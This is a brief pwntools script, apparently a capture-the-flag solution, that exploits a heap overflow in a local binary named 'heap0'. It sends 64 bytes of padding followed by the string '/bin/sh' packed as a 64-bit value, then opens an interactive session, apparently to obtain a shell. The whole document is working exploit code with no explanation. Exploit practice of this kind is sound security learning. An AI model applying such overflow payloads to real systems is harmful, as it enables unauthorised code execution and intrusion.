from pwn import *

r = process("./heap0")

r.recvline()
r.recvline()

r.recvuntil(": ")
r.send(b"a"*8*8 + p64(0x0068732f6e69622f))
r.interactive()